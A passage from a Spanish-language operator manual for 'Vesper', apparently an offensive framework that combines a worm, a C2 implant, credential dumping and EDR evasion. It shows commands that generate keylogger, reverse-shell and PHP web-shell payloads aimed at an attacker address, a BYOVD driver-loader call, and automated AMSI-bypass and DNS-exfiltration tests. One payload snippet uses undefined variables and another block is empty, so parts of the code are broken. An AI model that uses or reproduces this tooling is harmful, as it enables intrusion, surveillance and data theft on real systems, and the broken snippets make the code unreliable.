#   Elasticsearch: http://localhost:9200
```

### 12.2 Tests de Evasión

```bash
# El test runner ejecuta automáticamente:
#   1. Static detection check (Python modules)
#   2. AMSI bypass verification
#   3. LOLBin chain generation
#   4. DNS exfiltration check
#   5. In-memory payload execution

# Ver logs de tests
docker logs vesper_test_runner
```

### 12.3 Detener

```bash
docker-compose -f lab/docker-compose.edr.yml down
```

---

## 13. Generación de Payloads

```bash
# PowerShell (Windows)
python3 -c "
from plugins.worm.payloads.specialized_payloads import SpecializedPayloads
p = SpecializedPayloads('10.0.0.1', 8443)

# Simulación (markers seguros)
print(sim_payload[:200])

# Real (AES-256-CBC)
print(real_payload[:200])
"
```

### 13.2 Payloads Especializados

```bash
python3 -c "
from plugins.worm.payloads.specialized_payloads import SpecializedPayloads
p = SpecializedPayloads('10.0.0.1', 8443)

# Keylogger
print(p.generate_keylogger_payload()[:200])

# Screenshot
print(p.generate_screenshot_payload()[:200])

# Reverse Shell
print(p.generate_reverse_shell_payload('10.0.0.1', 4444)[:200])

# Web Shell
print(p.generate_web_shell('php')[:200])
"
```

### 13.3 Cross-Platform

```bash
# Generar para múltiples plataformas
python3 -c "
import sys
# La carga cross-platform genera ELF, Mach-O, y APK
"
```

---

## 14. Bridge Python

### 14.1 Handlers Disponibles

| Archivo | Handlers | Descripción |
|---------|----------|-------------|
| `attacks.py` | 9 | Brute force, SQLi, XSS, DoS |
| `bloodhound.py` | 5 | SharpHound data collection |
| `cred_dump.py` | 6 | Credential dumping |
| `phase_1_4.py` | **36** | **NUEVO** — Fase 1-4 handlers |

### 14.2 Invocación Directa

```python
from bridge.handlers.phase_1_4 import handle_byovd_loader

result = handle_byovd_loader({
    "drivers": ["WinRing0", "Gdrv"],
    "target_path": "C:\\Windows\\System32\\drivers"
})
print(result["success"])  # True
```

---

## 15. Solución de Problemas

### 15.1 Problemas Comunes

| Problema | Causa | Solución |
|----------|-------|----------|
| `ModuleNotFoundError: cryptography` | Dependencias Python no instaladas | `pip install -r requirements.txt` |
| Dashboard no carga | Puerto en uso o firewall | `lsof -i :9090` o cambiar puerto |
| Bridge Python no responde | Puerto 9100 ocupado | `pkill -f bridge.py && python3 bridge.py &` |
| ADB devices vacío | ADB no instalado o dispositivos no autorizados | `adb kill-server && adb start-server` |
| SDR no detectado | Drivers RTL-SDR/HackRF no instalados | `rtl_test -t` para verificar |
| Docker no arranca | Docker daemon parado | `sudo systemctl start docker` |
| Permisos denegados (Linux) | Raw sockets requieren root | `sudo setcap cap_net_raw+ep ./binary` |

### 15.2 Logs

```bash
# Logs del bridge Python
tail -f /tmp/vesper_bridge.log

# Logs del C2
tail -f /tmp/vesper_c2.log

# Logs del dashboard
tail -f /tmp/vesper_dashboard.log

# Logs del worm
tail -f logs/worm_*.log

# Logs de Docker
docker logs -f vesper_test_runner
```

### 15.3 Modo Verbose

```bash
# Activar debug en todos los componentes
export VESPER_DEBUG=1

# Niveles: 1 (info), 2 (debug), 3 (trace)
export VESPER_LOG_LEVEL=3
```

---

## 16. Referencia de Archivos

### 16.1 Estructura del Proyecto

```
Vesper/
├── cmd/                           CLI + agente implant
│   ├── vesper/                     Shell interactiva
│   └── implant/                   Agente C2 Go
├── internal/                      Core engine
│   │   ├── hydra_vectors/         8 vectores
│   │   ├── loader/                Cross-platform
│   │   ├── stager/                Reflective DLL
│   ├── agent/                     Post-explotación
│   ├── appstate/                  FSM + AI orchestrator
│   ├── bridge/                    Wazero WASM bridge
│   └── dispatch/                  Dispatcher + MITRE
├── modules/bridge/                Python bridge
│   ├── bridge.py                  RPC router
│   └── handlers/                  12 archivos, ~170 handlers
├── plugins/                       Plugins modulares
│   ├── worm/                      Worm + RL engine
│   ├── operations/                Argos agents
│   ├── pulse-c2/                  C2 hardened
│   ├── ai/                        AI plugins
│   ├── blue/bluesky/              Bluetooth attacks
│   └── rf_contagion/              RF SDR
├── lab/                           EDR test environment
├── pkg/proto/                     gRPC protos
├── docs/                          Documentación
├── scripts/                       Scripts auxiliares
├── deploy/deploy.sh               One-click deploy
├── ROADMAP.md                     Plan de desarrollo
├── README.md                      Documentación principal
└── requirements.txt               Dependencias Python
```

### 16.2 Documentación Adicional

| Documento | Contenido |
|-----------|-----------|
| `README.md` | Visión general, quick start, badges |
| `ROADMAP.md` | Plan de fases, módulos propuestos |
| `docs/ARCHITECTURE.md` | Arquitectura detallada |
| `docs/COMMANDS.md` | Referencia CLI completa |
| `docs/USAGE.md` | Documentación completa del framework |
| `docs/MODULES.md` | Catálogo de bridge handlers |
| `docs/CREATIVITY.md` | Contribuciones académicas |
| `docs/TESTING_GUIDE.md` | Guía de testing |
| `CHANGELOG.md` | Historial de cambios |
| `SECURITY.md` | Política de seguridad |
| `CONTRIBUTING.md` | Guía de contribución |

---

*Vesper v3.0 — Manual Operacional Completo — 2026*
